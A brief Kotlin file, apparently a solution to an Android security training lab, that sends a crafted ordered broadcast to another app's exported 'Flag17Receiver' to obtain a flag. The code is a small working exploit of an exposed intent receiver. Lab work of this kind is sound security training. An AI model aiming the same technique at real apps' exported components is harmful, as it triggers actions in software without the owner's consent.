package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent

object Flag17 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag17Receiver"
            )
            putExtra("flag", "give-flag-17")
        }
        context.sendOrderedBroadcast(intent, null)
    }
}
